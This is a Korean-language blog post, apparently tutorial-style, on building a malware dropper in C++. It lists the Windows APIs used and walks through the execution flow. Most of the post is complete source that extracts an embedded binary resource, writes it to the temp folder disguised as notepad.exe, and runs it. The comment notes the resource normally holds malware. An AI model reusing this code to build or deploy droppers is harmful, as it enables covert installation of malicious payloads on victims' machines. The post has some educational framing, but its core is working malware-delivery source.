---
title: C++로 Dropper 만들기
categories: 
 - Malware Analysis
 - Malware
tags: 
 - Dropper
---

## Dropper

Dropper는 정상 프로그램에 숨어있다가 정상 프로그램이 실행되면서 내장되어 있던 악성코드가 꺼내지고 정상 프로그램이 악성코드를 실행 시킨다.

### 주요 API

|API|설명|
|:---:|:---|
|GetTempPath|임시 파일로 지정된 디렉토리의 경로를 검색|
|FindResource|지정된 모듈에서 지정된 유형 및 이름을 사용하여 자원의 위치를 찾음|
|SizeofResource|자원의 크기(Byte)를 검색|
|LoadResource|메모리의 지정된 리소스의 핸들을 검색|
|LockResource|메모리에 있는 지정된 리소스에 대한 포인터 검색|
|CreateFile|파일이나 I/O장치를 만들거나 연다|
|SetFilePointer|지정한 파일의 파일 포인터를 이동시킨다|
|WriteFile|파일이나 I/O장치에 데이터를 기록|
|CreateProcess|새 프로세스와 기본 스레드를 실행|
|MessageBox|메시지가 포함된 대화 상자를 표시|

### 실행 흐름

1. GetTempPath 함수로 임시 디렉토리의 경로를 가져옴
1. FindResource 함수로 리소스 영역에 있는 파일을 찾는다
1. SizeofResource 파일의 크기를 가져온다
1. LoadResource 파일을 로드, 핸들을 가져온다
1. LockResource 메모리에 상주에 있는 파일의 포인터를 가져온다
1. CreateFile 파일을 하나 연다
1. SetFilePointer , WriteFile 함수로 EXE파일을 CreateFile로 만든 파일에다 데이터를 쓴다
1. CreateProcess 함수로 CreateFile에서 만든 파일을 실행시킨다

### 소스 코드

```c++
# 리소스에는 악성코드가 있지만 이 코드는 notepad를 실행한다.
#include "windows.h"
#include "resource.h"

#define APP_PATH MAX_PATH+1

HINSTANCE	hInst	 = NULL;

BOOL CoverDrop();
BOOL MalwareDrop();

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    
	hInst = hInstance;
	
	CoverDrop();

	return 0;
}

BOOL CoverDrop()
{
	WCHAR szAppFullPath[APP_PATH];
	WCHAR szTempPath[APP_PATH];
	WCHAR szSystemPath[APP_PATH];

	DWORD	dwResSize, dwByteWrite;
	HRSRC	hResource	= 0;
	HGLOBAL	hResData	= 0;
	LPVOID	lpData		= NULL;
	HANDLE	hFile		= NULL;

	// PATH ¼³Á¤
	GetTempPath(APP_PATH, szTempPath);
	//GetWindowsDirectory(szSystemPath, APP_PATH);
	wsprintf(szAppFullPath,L"%s\\notepad.exe",szTempPath);

	hResource = FindResource(hInst, MAKEINTRESOURCE(IDR_BIN1), L"BIN"); // IDR_BIN1은 리소스에 있는 파일이다. 
	dwResSize = SizeofResource(hInst, hResource);
	hResData = LoadResource(hInst, hResource);

	if (hResData != NULL && dwResSize != 0)
	{
		lpData = NULL;
		lpData = LockResource(hResData);
		hFile = CreateFile(szAppFullPath, // 파일을 생성
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);

		if (NULL != hFile && INVALID_HANDLE_VALUE != hFile)
		{
			SetFilePointer(hFile, 0, 0, FILE_BEGIN); //리소스 데이터를 만든 파일에 쓴다

			WriteFile(hFile,
				(LPBYTE)lpData,
				dwResSize,
				&dwByteWrite,
				NULL);

			CloseHandle(hFile);

			STARTUPINFO si={0, };
			PROCESS_INFORMATION pi;
			si.cb = sizeof(STARTUPINFO);
			si.dwFlags = 0;
			CreateProcess(NULL, szAppFullPath, NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi); //리소스를 저장한 파일을 실행
		}
		else
		{
			MessageBox(NULL, L"Install Fail hFile", L"Warning", MB_OK | MB_ICONSTOP);
		}
	}
	else
	{
		MessageBox(NULL, L"Install Fail hResData", L"Warning", MB_OK | MB_ICONSTOP);
	}
	return TRUE;
}
```





